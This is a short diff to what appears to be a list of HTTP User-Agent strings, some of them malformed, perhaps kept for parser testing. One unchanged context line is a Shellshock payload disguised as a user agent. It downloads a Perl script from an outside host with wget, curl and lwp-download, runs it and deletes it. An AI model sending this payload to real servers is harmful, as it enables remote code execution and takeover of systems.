@@ -168,3 +168,4 @@ Mozilla/5.0 (X11; U; SunOS sun4u; de-DE; rv:1.9.1b4 Gecko/20090428 Firefox/2.0.0
 () { :;(};/usr/bin/perl -e 'print ""Content-Type: text/plainrnrnZAZAZA""';system(""wget -O /tmp/gif.gif http://pjsn.hi2.ro/gif.gif;curl -O /tmp/gif.gif http://pjsn.hi2.ro/gif.gif; lwp-download -a http://pjsn.hi2.ro/gif.gif /tmp/gif.gif;perl /tmp/gif.gif;rm -rf /tmp/gif.gif*;exit""))
 Mozilla/4.7(9 [en] (compatible; MSIE 7.0; Windows NT 5.0; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648))
 Opera/9.10( (Windows NT 5.1; U; zh-tw))
+Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; FunWebProducts)
